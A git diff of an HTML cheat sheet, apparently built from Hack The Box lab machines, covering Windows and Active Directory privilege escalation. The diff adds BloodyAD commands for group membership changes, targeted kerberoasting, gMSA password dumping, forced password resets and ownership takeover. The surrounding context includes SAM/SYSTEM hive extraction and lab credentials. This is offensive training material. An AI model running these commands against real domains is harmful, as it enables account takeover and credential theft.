@@ -63,7 +63,7 @@
                 
 
                 <div class="notion-body">
-                    <h2 id="Sudo & SUID">Potatoes</h2>
+                    <h2 id="Potatoes">Potatoes</h2>
                     <ul>
                         <p> Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
                         <p> Use Sweet Potato to rule them all - Sweet Potato </p>
@@ -107,16 +107,53 @@ set LPORT 9999</code></pre>
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Sudo & SUID">BloodyAD</h2>
+                    <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
                         <h3>Adding users to groups</h3>
-                        <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
-                        <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila</code></pre>
+                        <ul>
+                            <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
+                            <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila</code></pre>
+                        </ul>
+                        <h3>Targeted kerberoasting</h3>
+                        <ul>
+                            <p>In case you found that you have the right <b>WriteSPN</b> over a user you can perform a targeted kerberoasting attack</p>
+                            <p>Here you asign a SPN to the alfred account. This makes the account vulnerable since we can request ticket with impacket tool</p>
+                            <pre><code class="language-bash">bloodyAD -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --host 10.10.11.72 set object alfred servicePrincipalName -v 'http/fake.tombwatcher.htb'</code></pre>
+                            <p>Then request the ticket with impacket tool, copy the ticket and crack it using hashcat</p>
+                            <pre><code class="language-bash">impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request</code></pre>        
+                        </ul>  
+                        <h3>Dump GSMA password</h3>
+                        <ul>
+                            <p>In case you found that you have the right <b>readGMSAPassword</b> over a user you can dump the GMSA password using the following script <a class="notion-link" href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py"> here </a> </p>
+                            <p></p>
+                            <pre><code class="language-bash">bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball get object ansible_dev$ --attr msDS-ManagedPassword</code></pre>
+                            <p>The result of this command outputs the NTLM hash which can be used to authenticate as another user <b>(msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:ecb4146b3f99e6bbf...)</b></p>
+                            <p></p>
+                        </ul>  
+
+                        <h3>Force Change password</h3>
+                        <ul>
+                            <p>In case you found that you have the right <b>ForceChangePassword</b> over a user you can change the password of it </p>
+                            <p></p>
+                            <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "ansible_dev$" -p p@ssword set password SAM "mypassword"</code></pre>
+                            <p></p>
+                        </ul> 
+
+                        <h3>Change Ownership</h3>
+                        <ul>
+                            <p>In case you found that you have the right <b>WriteOwner</b> over a user you can change the ownership of that user making it yours</p>
+                            <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "SAM" -p mypassword -k set owner john sam</code></pre>
+                            <p>Now that the users is ours we can apply <b>FullControl</b> over it. To do so we will use the following script <a class="notion-link" href="https://raw.githubusercontent.com/ShutDownRepo/impacket/dacledit/examples/dacledit.py"> here </a></p>
+                            <p>Then apply a password change with bloodAD and the user is yourse :)</p>
+                        </ul>
+                        
+                        
+
                     </ul>
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Sudo & SUID">SeBackupPrivilege</h2>
+                    <h2 id="SeBackupPrivilege">SeBackupPrivilege</h2>
                     <ul>
                         <p>In case you found that your user hash admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you can extrac the password hashes with the following commands</p>
                         <pre><code class="language-powershell">reg  save hklm\sam C:\Users\emily.oscars.CICADA\Documents\sam.hive
@@ -127,7 +164,7 @@ reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Sudo & SUID">MS09-012</h2>
+                    <h2 id="MS09-012">MS09-012</h2>
                     <ul>
                         <p>RCE in the service spooler which will grant us a privielge scalation method. Checkout github repo<a class="notion-link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/README.md"> here</a></p>
                         <p>Downlad the pr.exe file, transfer it to the victim and execute any command you want</p>
@@ -138,7 +175,7 @@ reg save hklm\system C:\Users\emily.oscars.CICADA\Documents\system.hive</code></
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Sudo & SUID">Dumping SAM credentials</h2>
+                    <h2 id="Dumping SAM credentials">Dumping SAM credentials</h2>
                     <ul>
                         <p>In case you found that you have access to SAM and SYSTEM files you can dump credentials and crack them offline. By anycase, you only be able to do so in case you found this files in a backup you can access or if you have admin rights</p>
                         <p>Download both files and use <b>secretsdump</b> from impacket</p>
